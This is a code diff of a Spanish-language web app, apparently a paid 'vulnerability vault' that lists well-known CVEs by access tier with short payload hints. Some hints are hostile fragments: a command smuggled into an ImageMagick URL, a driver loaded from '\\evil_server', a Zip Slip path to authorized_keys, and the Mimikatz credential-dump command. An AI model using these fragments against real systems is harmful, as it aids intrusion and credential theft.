+            { id: 'eternalblue', title: 'ETERNALBLUE', cve: 'CVE-2017-0144', year: 2017, severity: 'CRITICAL', score: 9.9, description: 'Exploit de la NSA para SMBv1. Permite enviar paquetes diseñados para ejecutar código arbitrario en Windows.', impact: 'Base de WannaCry y NotPetya. Uno de los exploits más dañinos de la historia.', affected: ['Windows (Todas las versiones pre-parche)'], patched: true, premium: false, type: 'RCE / Buffer Overflow', codeSnippet: '// Heap grooming + Overflow en Srv!SrvOs2FeaListSizeToNt' },
+            { id: 'bluekeep', title: 'BLUEKEEP', cve: 'CVE-2019-0708', year: 2019, severity: 'CRITICAL', score: 9.8, description: 'Vulnerabilidad RDP "wormable" que permite ejecución remota de código sin autenticación.', impact: 'Potencial catastrófico. Microsoft lanzó parches incluso para el obsoleto Windows XP.', affected: ['Windows 7', 'Server 2008 R2', 'Win XP'], patched: true, premium: true, reqRole: 'zeroday', type: 'Use-after-free RDP', codeSnippet: '// Manipulación de canales virtuales RDP MS_T120' },
+            { id: 'dirtycow', title: 'DIRTY COW', cve: 'CVE-2016-5195', year: 2016, severity: 'HIGH', score: 7.8, description: 'Condición de carrera en el kernel de Linux (Copy-On-Write) que permitía a usuarios locales ganar root.', impact: 'Afectó a todos los sistemas Linux y Android desplegados durante 9 años.', affected: ['Linux Kernel 2.6.22+', 'Android'], patched: true, premium: false, type: 'Privilege Escalation', codeSnippet: 'mmap(..., PROT_READ, MAP_PRIVATE, fd, 0); // Race on memory write' },
+            { id: 'zerologon', title: 'ZEROLOGON', cve: 'CVE-2020-1472', year: 2020, severity: 'CRITICAL', score: 10.0, description: 'Fallo criptográfico en Netlogon. Un atacante podía poner la contraseña del Domain Controller en ceros.', impact: 'Permitía tomar control total de un dominio Windows Active Directory en segundos.', affected: ['Windows Server (Domain Controllers)'], patched: true, premium: true, reqRole: 'zeroday', type: 'Crypto Flaw', codeSnippet: 'client_challenge = "00000000"; // Bypass de autenticación AES-CFB8' },
+            { id: 'solarwinds', title: 'SUNBURST (SOLARWINDS)', cve: 'CVE-2020-10148 (Related)', year: 2020, severity: 'CRITICAL', score: 10.0, description: 'Atacantes rusos inyectaron una puerta trasera en las actualizaciones legítimas del software Orion.', impact: 'Comprometió al Pentágono, Microsoft, Cisco, y miles de corporaciones.', affected: ['SolarWinds Orion', 'Gobierno de USA'], patched: true, premium: true, reqRole: 'root', type: 'Supply Chain Attack', codeSnippet: 'OrionImprovementBusinessLayer.Initialize(); // Backdoor activado' },
+            { id: 'mimikatz', title: 'MIMIKATZ (TOOL)', cve: 'N/A', year: 2011, severity: 'HIGH', score: 8.0, description: 'No es un CVE, pero es la herramienta que explota WDigest para extraer contraseñas en texto plano de la memoria.', impact: 'Estándar de facto para movimiento lateral en redes Windows.', affected: ['Windows LSASS'], patched: 'Mitigado (Credential Guard)', premium: false, type: 'Credential Dumping', codeSnippet: 'sekurlsa::logonpasswords' },
+            { id: 'printnightmare', title: 'PRINTNIGHTMARE', cve: 'CVE-2021-34527', year: 2021, severity: 'HIGH', score: 8.8, description: 'RCE en el servicio Print Spooler de Windows. Permitía a cualquier usuario instalar drivers maliciosos.', impact: 'Caos en dominios Windows, permitiendo a usuarios bajos privilegios tomar control del DC.', affected: ['Windows Print Spooler'], patched: true, premium: true, reqRole: 'zeroday', type: 'RCE / LPE', codeSnippet: 'RpcAddPrinterDriverEx(..., "\\\\evil_server\\driver.dll")' },
+            { id: 'proxylogon', title: 'PROXYLOGON', cve: 'CVE-2021-26855', year: 2021, severity: 'CRITICAL', score: 9.8, description: 'Chain de exploits en MS Exchange Server.', impact: 'Acceso total a correos de miles de empresas.', affected: ['Exchange Server'], patched: true, premium: true, reqRole: 'root', type: 'SSRF to RCE', codeSnippet: 'Cookie: X-AnonResource=true; X-AnonResource-Backend=.../ecp/default.flt' },
+            { id: 'dirtypipe', title: 'DIRTY PIPE', cve: 'CVE-2022-0847', year: 2022, severity: 'HIGH', score: 7.8, description: 'Sobreescritura de archivos de solo lectura en Linux.', impact: 'Escalada de privilegios instantánea a root.', affected: ['Linux Kernel 5.8+'], patched: true, premium: false, type: 'Privilege Escalation', codeSnippet: 'splice() -> pipe_buffer -> page_cache overwrite' },
+            // Agregué más elementos para llegar al número original
+            { id: 'follina', title: 'FOLLINA', cve: 'CVE-2022-30190', year: 2022, severity: 'HIGH', score: 7.8, description: 'RCE en MSDT vía documentos Word sin macros.', impact: 'Ejecución de código al solo previsualizar un doc.', affected: ['Microsoft Office', 'MSDT'], patched: true, premium: true, reqRole: 'zeroday', type: 'RCE', codeSnippet: 'ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile..."' },
+            { id: 'spring4shell', title: 'SPRING4SHELL', cve: 'CVE-2022-22965', year: 2022, severity: 'CRITICAL', score: 9.8, description: 'RCE en Spring Framework vía Data Binding.', impact: 'Similar a Log4j pero más difícil de explotar.', affected: ['Spring MVC', 'Tomcat'], patched: true, premium: true, reqRole: 'root', type: 'RCE', codeSnippet: 'class.module.classLoader.resources.context.parent.pipeline.first...' },
+            { id: 'cve-2019-11043', title: 'PHP-FPM RCE', cve: 'CVE-2019-11043', year: 2019, severity: 'CRITICAL', score: 9.8, description: 'Buffer underflow en PHP-FPM con Nginx.', impact: 'RCE en servidores web Nginx/PHP mal configurados.', affected: ['Nginx + PHP-FPM'], patched: true, premium: true, reqRole: 'breacher', type: 'Buffer Underflow', codeSnippet: 'fastcgi_split_path_info ^(.+?\.php)(/.*)$; # Configuración vulnerable' },
+            { id: 'ghost', title: 'GHOST', cve: 'CVE-2015-0235', year: 2015, severity: 'CRITICAL', score: 9.8, description: 'Buffer overflow en glibc (gethostbyname).', impact: 'RCE en Linux, afectando Exim y otros servicios.', affected: ['glibc Linux'], patched: true, premium: true, reqRole: 'breacher', type: 'Heap Overflow', codeSnippet: 'gethostbyname("0" * 2500)' },
+            { id: 'stagefright', title: 'STAGEFRIGHT', cve: 'CVE-2015-1538', year: 2015, severity: 'CRITICAL', score: 10.0, description: 'RCE en Android procesando video MMS.', impact: 'Comprometía teléfonos con solo recibir un MMS.', affected: ['Android libstagefright'], patched: true, premium: true, reqRole: 'root', type: 'Remote Code Execution', codeSnippet: 'MMS Video parsing Integer Overflow' },
+            { id: 'ripple20', title: 'RIPPLE20', cve: 'Multiple', year: 2020, severity: 'CRITICAL', score: 9.8, description: '19 vulnerabilidades en la pila TCP/IP de Treck.', impact: 'Millones de dispositivos IoT afectados (HP, Schneider, Intel).', affected: ['IoT Devices'], patched: 'Parcial', premium: true, reqRole: 'root', type: 'TCP/IP Stack Flaws', codeSnippet: 'Malforme IP fragments causing Heap Overflow' },
+            { id: 'curveball', title: 'CURVEBALL', cve: 'CVE-2020-0601', year: 2020, severity: 'CRITICAL', score: 8.1, description: 'Fallo en validación de curvas elípticas en Windows.', impact: 'Permitía spoofing de certificados Code Signing y SSL.', affected: ['Windows 10', 'Server 2016'], patched: true, premium: true, reqRole: 'zeroday', type: 'Crypto Spoofing', codeSnippet: 'Spoofed CA Certificate with custom Generator point' },
+            { id: 'sudo-baron', title: 'BARON SAMEDIT', cve: 'CVE-2021-3156', year: 2021, severity: 'HIGH', score: 7.8, description: 'Heap overflow en Sudo.', impact: 'Root en casi cualquier Linux/Unix en configuración por defecto.', affected: ['Sudo'], patched: true, premium: false, type: 'LPE', codeSnippet: 'sudoedit -s \\' },
+            { id: 'polkit', title: 'PWNKIT', cve: 'CVE-2021-4034', year: 2021, severity: 'HIGH', score: 7.8, description: 'Escalada de privilegios en Polkit pkexec.', impact: 'Root en Linux presente desde 2009.', affected: ['Polkit pkexec'], patched: true, premium: true, reqRole: 'breacher', type: 'LPE', codeSnippet: 'pkexec (envp manipulation via NULL argv)' },
+            { id: 'omigod', title: 'OMIGOD', cve: 'CVE-2021-38647', year: 2021, severity: 'CRITICAL', score: 9.8, description: 'RCE en Azure OMI agent (instalado silenciosamente).', impact: 'Root remoto en VMs Linux de Azure.', affected: ['Azure Linux VMs'], patched: true, premium: true, reqRole: 'zeroday', type: 'RCE', codeSnippet: 'Authorization: Basic (sin contraseña, solo header)' },
+            { id: 'cve-2016-4117', title: 'FLASH PLAYER RCE', cve: 'CVE-2016-4117', year: 2016, severity: 'CRITICAL', score: 9.8, description: 'Referencia a variable no definida en ActionScript.', impact: 'RCE a través de webs maliciosas. Común en Exploit Kits.', affected: ['Adobe Flash'], patched: true, premium: true, reqRole: 'breacher', type: 'Type Confusion', codeSnippet: 'delete function_ref; // Use-after-free trigger' },
+            { id: 'magentoshop', title: 'MAGENTO SHOPLIFT', cve: 'CVE-2015-1397', year: 2015, severity: 'CRITICAL', score: 9.8, description: 'SQL Injection que permitía crear admins.', impact: 'Miles de tiendas online hackeadas (e-commerce skimming).', affected: ['Magento'], patched: true, premium: true, reqRole: 'breacher', type: 'SQL Injection', codeSnippet: 'popularity[from]=?&popularity[to]=?&popularity[field_expr]=...' },
+            { id: 'ruby-yaml', title: 'RUBY ON RAILS YAML', cve: 'CVE-2013-0156', year: 2013, severity: 'CRITICAL', score: 10.0, description: 'RCE al parsear XML/YAML en peticiones.', impact: 'Ejecución de código en servidores Rails.', affected: ['Ruby on Rails'], patched: true, premium: true, reqRole: 'breacher', type: 'Insecure Deserialization', codeSnippet: '<yaml> --- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection' },
+            { id: 'image-tragick', title: 'IMAGETRAGICK', cve: 'CVE-2016-3714', year: 2016, severity: 'HIGH', score: 8.4, description: 'RCE al procesar imágenes con ImageMagick.', impact: 'Subir una imagen resultaba en ejecución de comandos.', affected: ['ImageMagick'], patched: true, premium: true, reqRole: 'breacher', type: 'Command Injection', codeSnippet: 'fill \'url(https://example.com/image.jpg"|ls "-la)\'' },
+            { id: 'drown', title: 'DROWN ATTACK', cve: 'CVE-2016-0800', year: 2016, severity: 'HIGH', score: 5.9, description: 'Descifrado de TLS usando servidores con SSLv2 habilitado.', impact: 'Comprometió HTTPS en 33% de servidores web.', affected: ['OpenSSL', 'SSLv2'], patched: true, premium: true, reqRole: 'zeroday', type: 'Cross-protocol attack', codeSnippet: 'Bleichenbacher padding oracle attack variant' },
+            { id: 'mirai', title: 'MIRAI BOTNET', cve: 'N/A (Weak Creds)', year: 2016, severity: 'HIGH', score: 9.0, description: 'Malware que infectaba IoT usando credenciales por defecto.', impact: 'Tumbó DynDNS, dejando offline Twitter, Netflix y más.', affected: ['Cámaras IP', 'Routers'], patched: 'N/A', premium: false, type: 'Botnet', codeSnippet: 'telnet user:admin pass:12345' },
+            { id: 'pegasus', title: 'PEGASUS SPYWARE', cve: 'Multiple (Trident)', year: 2016, severity: 'CRITICAL', score: 9.8, description: 'Spyware de NSO Group para iOS/Android.', impact: 'Vigilancia total de periodistas y activistas (Zero-click).', affected: ['iOS', 'Android'], patched: 'Gato y ratón', premium: true, reqRole: 'root', type: 'Zero-click Exploit', codeSnippet: 'PDF/iMessage parsing exploits (FORCEDENTRY)' },
+            { id: 'struts-2013', title: 'STRUTS OGNL', cve: 'CVE-2013-2251', year: 2013, severity: 'CRITICAL', score: 9.3, description: 'RCE vía manipulación de parámetros OGNL.', impact: 'Precursor de grandes brechas en banca y gobierno.', affected: ['Apache Struts'], patched: true, premium: true, reqRole: 'breacher', type: 'RCE', codeSnippet: '${#context[\'xwork.MethodAccessor.denyMethodExecution\']=false...' },
+            { id: 'zip-slip', title: 'ZIP SLIP', cve: 'N/A (Generic)', year: 2018, severity: 'HIGH', score: 7.5, description: 'Sobreescritura de archivos arbitrarios al descomprimir.', impact: 'RCE en librerías de Java, JS, .NET.', affected: ['Librerías de descompresión'], patched: true, premium: true, reqRole: 'breacher', type: 'Path Traversal', codeSnippet: 'filename = "../../../../../../../root/.ssh/authorized_keys"' },
+            { id: 'clickjacking', title: 'CLICKJACKING', cve: 'N/A (Design)', year: 2008, severity: 'MEDIUM', score: 5.0, description: 'Engañar al usuario para clickear algo invisible.', impact: 'Robo de likes, transferencias bancarias, activación de cámara.', affected: ['Web Browsers'], patched: 'X-Frame-Options', premium: false, type: 'UI Redressing', codeSnippet: 'iframe { opacity: 0; z-index: 999; }' },
+            { id: 'slowloris', title: 'SLOWLORIS', cve: 'N/A', year: 2009, severity: 'MEDIUM', score: 5.0, description: 'DoS manteniendo conexiones HTTP abiertas infinitamente.', impact: 'Tumba servidores Apache con ancho de banda mínimo.', affected: ['Apache Web Server'], patched: 'Mitigado', premium: false, type: 'Denial of Service', codeSnippet: 'GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: x\r\n (sin cierre)' },
+            { id: 'breach-attack', title: 'BREACH', cve: 'CVE-2013-3587', year: 2013, severity: 'MEDIUM', score: 5.9, description: 'Robo de secretos en HTTPS comprimido (gzip).', impact: 'Permite extraer tokens CSRF byte a byte.', affected: ['HTTP Compression'], patched: 'Difícil', premium: true, reqRole: 'zeroday', type: 'Side-Channel', codeSnippet: 'Medir tamaño de respuesta comprimida al inyectar texto' },
+            { id: 'hertzbleed', title: 'HERTZBLEED', cve: 'CVE-2022-24436', year: 2022, severity: 'MEDIUM', score: 6.0, description: 'Side-channel midiendo frecuencia de CPU (DVFS).', impact: 'Extracción de claves criptográficas (SIKE).', affected: ['Intel', 'AMD'], patched: 'Mitigado', premium: true, reqRole: 'root', type: 'Side-Channel (Frequency)', codeSnippet: 'Medir tiempo de ejecución vs consumo de energía/frecuencia' }
         ];
 
-        // --- 2. ESTADO DE LA APLICACIÓN ---
 
-        let state = {
-            user: { role: 'free', name: 'Guest', email: '' },
-            currentView: 'home',
-            selectedVuln: null,
-            modalPlan: null,
-            isAuthReady: false
-        };
+        // --- ESTADO GLOBAL (Simulación de React State) ---
+        let user = { role: 'free', name: 'Guest', email: '' };
+        let view = 'home';
+        let selectedVuln = null;
+        let modalPlan = null;
+        let searchTerm = '';
 
-        // --- 3. FUNCIONES DE LÓGICA DE NEGOCIO ---
+        // --- UTILIDADES ---
 
-        const getAccessLevel = (role) => {
+        /**
+         * Mapa de SVGs para iconos Lucide-like
+         * @param {string} name - Nombre del icono.
+         * @param {string} [className] - Clases de Tailwind.
+         * @param {number} [size] - Tamaño del icono.
+         */
+        function getIcon(name, className = '', size = 24) {
+            const icons = {
+                // Lucide icons
+                Shield: '<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>',
+                Lock: '<rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
+                Unlock: '<rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/><path d="M15 17h1"/><path d="M15 21h1"/>',
+                Terminal: '<polyline points="4 17 10 17 4 21"/><line x1="12" x2="20" y1="12" y2="12"/>',
+                Cpu: '<rect width="16" height="16" x="4" y="4" rx="2"/><path d="M6 9h2"/><path d="M6 15h2"/><path d="M16 9h2"/><path d="M16 15h2"/><path d="M9 18v2"/><path d="M15 18v2"/><path d="M9 6v2"/><path d="M15 6v2"/>',
+                Zap: '<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>',
+                CreditCard: '<rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/>',
+                QrCode: '<rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><path d="M14 14h.01"/><path d="M18 18h.01"/><path d="M18 14h.01"/><path d="M14 18h.01"/>',
+                Globe: '<circle cx="12" cy="12" r="10"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/><line x1="2" x2="22" y1="12" y2="12"/>',
+                AlertTriangle: '<path d="M10.29 3.86L1.86 18.25C1.65 18.6 1.68 19.01 1.88 19.34L11.88 19.34C12.12 19.54 12.38 19.46 12.58 19.34L22.14 3.86C22.35 3.51 22.32 3.1 22.12 2.77L12.58 2.77C12.38 2.58 12.12 2.5 11.88 2.77Z"/><line x1="12" x2="12" y1="9" y2="13"/><line x1="12" x2="12.01" y1="17" y2="17"/>',
+                Database: '<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5v14a9 3 0 0 0 18 0V5"/><path d="M3 12a9 3 0 0 0 18 0"/>',
+                ChevronRight: '<polyline points="9 18 15 12 9 6"/>',
+                CheckCircle: '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>',
+                XCircle: '<circle cx="12" cy="12" r="10"/><path d="m15 9-6 6"/><path d="m9 9 6 6"/>',
+                Server: '<rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><path d="M6 6h.01"/><path d="M6 18h.01"/>',
+                User: '<path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>',
+                Ghost: '<path d="M9 10L9 16"/><path d="M15 10L15 16"/><path d="M22 11c0 6-3 8-3 8H5s-3-2-3-8a4 4 0 1 1 8 0V7a4 4 0 1 1 8 0v4a4 4 0 1 0 4 4Z"/>',
+                Fingerprint: '<path d="M12 5V2"/><path d="M10 12H7"/><path d="M12 12V6"/><path d="M12 17v-4"/><path d="M17 12h-3"/><path d="M15 21c-3.3 0-6.1-1.6-8-4"/><path d="M5.5 8.5C6.4 7.2 8.1 6 10 6"/><path d="M18.5 8.5c-.9 1.3-2.6 2.5-4.5 2.5"/><path d="M2 12c.5 3.3 3.3 6 7 6"/><path d="M22 12c-.5 3.3-3.3 6-7 6"/><path d="M12 22a7 7 0 0 0 7-7c0-1.2-.5-2.2-1.3-3"/><path d="M12 2a7 7 0 0 0-7 7c0 1.2.5 2.2 1.3 3"/>',
+                Activity: '<polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>',
+                Hash: '<line x1="4" x2="20" y1="9" y2="9"/><line x1="4" x2="20" y1="15" y2="15"/><line x1="10" x2="8" y1="3" y2="21"/><line x1="16" x2="14" y1="3" y2="21"/>',
+                AlertOctagon: '<polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/>',
+                Search: '<circle cx="11" cy="11" r="8"/><line x1="21" x2="16.65" y1="21" y2="16.65"/>',
+            };
+            const svgContent = icons[name] || icons.Shield; // Fallback
+            return `<svg xmlns="http://www.w3.org/2000/svg" width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="${className}">${svgContent}</svg>`;
+        }
+
+        /**
+         * Obtiene el nivel de acceso numérico para comparar.
+         */
+        function getAccessLevel(role) {
             if (role === 'root') return 3;
             if (role === 'zeroday') return 2;
             if (role === 'breacher') return 1;
             return 0;
-        };
+        }
 
-        const hasAccess = (vulnRole) => {
-            const userLevel = getAccessLevel(state.user.role);
+        /**
+         * Verifica si el usuario tiene acceso a la vulnerabilidad.
+         */
+        function hasAccess(vulnRole) {
+            const userLevel = getAccessLevel(user.role);
             const reqLevel = getAccessLevel(vulnRole || 'free');
             return userLevel >= reqLevel;
-        };
-        
-        const formatCurrency = (amount) => {
-            return amount.toLocaleString('es-AR', { style: 'currency', currency: 'ARS', minimumFractionDigits: 0 });
         }
 
-
-        // --- 4. CONTROL DE VISTAS ---
-
-        function navigate(viewName, vulnId = null) {
-            state.currentView = viewName;
+        /**
+         * Asigna el nuevo estado y redibuja la aplicación.
+         */
+        function setState(newState) {
+            // Actualiza solo las propiedades provistas en newState
+            if (newState.user !== undefined) user = newState.user;
+            if (newState.view !== undefined) view = newState.view;
+            if (newState.selectedVuln !== undefined) selectedVuln = newState.selectedVuln;
+            if (newState.modalPlan !== undefined) modalPlan = newState.modalPlan;
+            if (newState.searchTerm !== undefined) searchTerm = newState.searchTerm;
             
-            // Ocultar todas las secciones
-            document.querySelectorAll('.view-section').forEach(section => {
-                section.classList.add('hidden');
-            });
-
-            // Mostrar la sección correcta
-            const targetSection = document.getElementById(\`view-\${viewName}\`);
-            if (targetSection) {
-                targetSection.classList.remove('hidden');
-            }
-
-            // Actualizar enlaces de navegación
-            document.querySelectorAll('.nav-link').forEach(link => {
-                link.classList.remove('text-cyan-400', 'border-b', 'border-cyan-400');
-                if (link.dataset.view === viewName) {
-                    link.classList.add('text-cyan-400', 'border-b', 'border-cyan-400');
-                }
-            });
-
-            // Renderizado específico de la vista
-            if (viewName === 'home') renderHome();
-            if (viewName === 'pricing') renderPricing();
-            if (viewName === 'vault') renderVault();
-            if (viewName === 'vuln-detail' && vulnId) {
-                state.selectedVuln = VULNERABILITIES.find(v => v.id === vulnId);
-                renderDetail();
-            }
-            
-            updateHeader();
-            window.scrollTo(0, 0); // Scroll al inicio de la página
-            
-            // Volver a renderizar iconos de Lucide
-            if(window.lucide) {
-                window.lucide.createIcons();
-            }
+            renderApp();
         }
 
-        // --- 5. FUNCIONES DE RENDERING (Generación de HTML) ---
-        
-        function updateHeader() {
-            const roleDisplay = document.getElementById('user-role-display');
-            const userIcon = document.getElementById('user-icon');
-
-            if (roleDisplay) {
-                roleDisplay.textContent = state.user.role.toUpperCase();
-                roleDisplay.classList.remove('text-red-500', 'animate-pulse');
-                
-                if (state.user.role === 'root') {
-                    roleDisplay.textContent = 'GOD MODE';
-                    roleDisplay.classList.add('text-red-500', 'animate-pulse');
-                    userIcon.className = 'w-8 h-8 rounded border flex items-center justify-center bg-red-900/20 border-red-500';
-                } else {
-                     userIcon.className = 'w-8 h-8 rounded border flex items-center justify-center bg-slate-800 border-slate-700';
-                }
-            }
-             if(window.lucide) {
-                window.lucide.createIcons();
-            }
-        }
-
-        function renderHome() {
-            document.getElementById('indexed-records').textContent = VULNERABILITIES.length;
-        }
-        
-        function renderPricing() {
-            const container = document.getElementById('pricing-plans');
-            container.innerHTML = PLANS.map(plan => {
-                const isCurrent = state.user.role === plan.id;
-                const buttonClass = isCurrent 
-                    ? 'bg-slate-800 text-slate-500 cursor-not-allowed border border-slate-700'
-                    : 'bg-white text-black hover:bg-slate-200 border border-transparent';
-                const buttonText = isCurrent ? 'CURRENT LEVEL' : 'INITIATE UPGRADE';
-                const shadow = plan.id === 'root' ? 'shadow-[0_0_50px_rgba(239,68,68,0.4)]' : 'shadow-2xl';
-
-                return \`
-                    <div class="relative bg-slate-900/80 backdrop-blur-md rounded-xl border \${plan.borderColor} p-8 flex flex-col hover:transform hover:-translate-y-1 transition duration-300 \${shadow} overflow-hidden group">
-                        \${plan.id === 'root' ? \`<div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500 via-orange-500 to-red-500 animate-scan-fast"></div>\` : ''}
-                        <div class="mb-6">
-                            <h3 class="text-2xl font-black uppercase tracking-widest bg-gradient-to-r \${plan.color} bg-clip-text text-transparent">\${plan.name}</h3>
-                            <div class="flex items-end gap-2 mt-4">
-                                <span class="text-5xl font-bold text-white">\$$\{plan.priceUsd\}</span>
-                                <span class="text-slate-500 mb-2 text-xs font-mono uppercase">/ Pago Único</span>
-                            </div>
-                            <div class="text-xs text-slate-500 font-mono mt-2 pt-2 border-t border-white/5">
-                                ≈ \${formatCurrency(plan.priceUsd * USD_TO_ARS)}
-                            </div>
-                        </div>
-                        <ul class="space-y-4 mb-8 flex-1">
-                            \${plan.features.map(feat => \`
-                                <li class="flex items-start gap-3 text-slate-300 text-sm font-mono">
-                                    <div data-lucide="check-circle" size="16" class="mt-0.5 shrink-0 \${plan.id === 'root' ? 'text-red-500' : 'text-cyan-500'}"></div>
-                                    \${feat}
-                                </li>
-                            \`).join('')}
-                        </ul>
-                        <button onclick="showPaymentModal('\${plan.id}')" class="w-full py-4 rounded font-bold uppercase tracking-widest transition-all relative overflow-hidden \${buttonClass}" \${isCurrent ? 'disabled' : ''}>
-                            \${plan.id === 'root' && !isCurrent ? '<span class="absolute inset-0 bg-red-500 mix-blend-multiply opacity-20"></span>' : ''}
-                            \${buttonText}
-                        </button>
-                    </div>
-                \`;
-            }).join('');
-             if(window.lucide) {
-                window.lucide.createIcons();
-            }
-        }
-
-        function renderVault() {
-            const container = document.getElementById('vulnerability-list');
-            const searchInput = document.getElementById('search-input').value.toLowerCase();
-            
-            const filteredVulns = VULNERABILITIES.filter(v => 
-                v.title.toLowerCase().includes(searchInput) ||
-                v.cve.toLowerCase().includes(searchInput) ||
-                v.type.toLowerCase().includes(searchInput)
+        /**
+         * Lógica de filtrado de vulnerabilidades.
+         */
+        function getFilteredVulns() {
+            if (!searchTerm) return VULNERABILITIES;
+            const term = searchTerm.toLowerCase();
+            return VULNERABILITIES.filter(v =>
+                v.title.toLowerCase().includes(term) ||
+                v.cve.toLowerCase().includes(term) ||
+                v.type.toLowerCase().includes(term)
             );
+        }
+        
+        // --- HANDLERS GLOBALES ---
 
-            document.getElementById('vuln-count').textContent = filteredVulns.length;
-            
-            container.innerHTML = filteredVulns.map(vuln => {
-                const locked = vuln.premium && !hasAccess(vuln.reqRole);
-                const clickAction = locked 
-                    ? \`showPaymentModal('\${vuln.reqRole}')\` 
-                    : \`Maps('vuln-detail', '\${vuln.id}')\`;
-                
-                const lockIcon = locked ? '<div data-lucide="lock" size="16" class="text-slate-700"></div>' : '<div data-lucide="unlock" size="16" class="text-cyan-500 opacity-0 group-hover:opacity-100 transition"></div>';
-                const lockOverlay = locked ? \`
-                    <div class="absolute inset-0 flex items-center justify-center backdrop-blur-sm bg-black/20 z-10">
-                        <div class="bg-black border border-red-900/50 p-3 rounded flex items-center gap-2 text-red-500 font-mono text-xs uppercase tracking-widest shadow-2xl transform group-hover:scale-105 transition">
-                            <div data-lucide="lock" size="12"></div> Requires \${vuln.reqRole}
-                        </div>
-                    </div>
-                \` : '';
-                
-                return \`
-                    <div onclick="\${clickAction}" class="relative p-6 rounded border transition-all duration-200 cursor-pointer group overflow-hidden \${locked ? 'bg-slate-900/30 border-slate-800 hover:border-slate-700' : 'bg-slate-900/80 border-white/10 hover:border-cyan-500/50 hover:bg-slate-800'}">
-                        \${!locked ? '<div class="absolute inset-0 bg-gradient-to-b from-transparent via-cyan-500/5 to-transparent opacity-0 group-hover:opacity-100 translate-y-[-100%] group-hover:translate-y-[100%] transition-all duration-700 pointer-events-none"></div>' : ''}
-                        <div class="flex justify-between items-start mb-4">
-                            <div class="px-2 py-1 rounded text-[10px] font-bold font-mono tracking-wider \${locked ? 'bg-slate-800 text-slate-600' : 'bg-purple-900/20 text-purple-400 border border-purple-500/20'}">\${vuln.cve.split(' ')[0]}</div>
-                            \${lockIcon}
-                        </div>
-                        <h3 class="text-lg font-bold mb-2 font-mono uppercase truncate \${locked ? 'text-slate-600 blur-[1px]' : 'text-white'}">\${vuln.title}</h3>
-                        <div class="flex gap-2 mb-4">
-                            <span class="text-[10px] uppercase px-1.5 py-0.5 rounded border \${locked ? 'border-slate-800 text-slate-700' : 'border-slate-700 text-slate-400'}">\${vuln.type}</span>
-                        </div>
-                        \${lockOverlay}
-                        <div class="flex items-center justify-between pt-4 border-t border-white/5">
-                            <span class="text-xs font-mono \${locked ? 'text-slate-800' : 'text-slate-500'}">\${vuln.year}</span>
-                            <div class="flex items-center gap-2">
-                                <span class="text-xs font-bold \${locked ? 'text-slate-800' : vuln.score >= 9 ? 'text-red-500' : 'text-yellow-500'}">CVSS \${vuln.score}</span>
-                                <div data-lucide="alert-octagon" size="12" class="\${locked ? 'text-slate-800' : vuln.score >= 9 ? 'text-red-500' : 'text-yellow-500'}"></div>
-                            </div>
-                        </div>
-                    </div>
-                \`;
-            }).join('');
-             if(window.lucide) {
-                window.lucide.createIcons();
-            }
+        /**
+         * Maneja el cambio de vista.
+         */
+        function handleViewChange(newView) {
+            setState({ view: newView, selectedVuln: null });
+        }
+
+        /**
+         * Inicia el proceso de mejora de plan.
+         */
+        function handleUpgrade(plan) {
+            setState({ modalPlan: plan });
+        }
+
+        /**
+         * Simula el éxito del pago.
+         */
+        function handlePaymentSuccess() {
+            setState({ 
+                user: { ...user, role: modalPlan.id },
+                modalPlan: null,
+                view: 'vault'
+            });
+        }
+
+        /**
+         * Cierra el modal de pago.
+         */
+        function handleModalClose() {
+            setState({ modalPlan: null });
         }
         
-        function renderDetail() {
-            const vuln = state.selectedVuln;
-            if (!vuln) return;
-            
-            const content = \`
-                <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-                    <div class="lg:col-span-2 space-y-8">
-                        <div>
-                            <div class="flex flex-wrap items-center gap-4 mb-6">
-                                <h1 class="text-5xl font-black text-white tracking-tighter">\${vuln.title}</h1>
-                                <div class="px-3 py-1 bg-red-500/10 text-red-500 border border-red-500/50 rounded text-xs font-bold font-mono">SEVERITY: \${vuln.score}</div>
-                                 <div class="px-3 py-1 bg-slate-800 text-slate-300 rounded text-xs font-bold font-mono">\${vuln.cve}</div>
-                            </div>
-                            <p class="text-xl text-slate-300 leading-relaxed border-l-2 border-purple-500 pl-6 font-light">\${vuln.description}</p>
-                        </div>
-                        <div class="bg-black rounded-lg border border-slate-800 overflow-hidden shadow-2xl">
-                           <div class="bg-slate-900 px-4 py-2 flex items-center justify-between border-b border-slate-800">
-                              <h3 class="text-xs font-bold text-slate-400 flex items-center gap-2 uppercase tracking-widest"><div data-lucide="terminal" size="14" class="text-green-500"></div> Payload / Vector Concept</h3>
-                              <div class="flex gap-1.5"><div class="w-2.5 h-2.5 rounded-full bg-slate-700"></div><div class="w-2.5 h-2.5 rounded-full bg-slate-700"></div></div>
-                           </div>
-                           <div class="p-6 font-mono text-sm text-slate-300 overflow-x-auto">
-                             <p class="text-slate-500 mb-2"># Technical Implementation (Sanitized)</p>
-                             <div class="text-green-400 typewriter-text">\${vuln.codeSnippet || "// Code censored for security reasons"}</div>
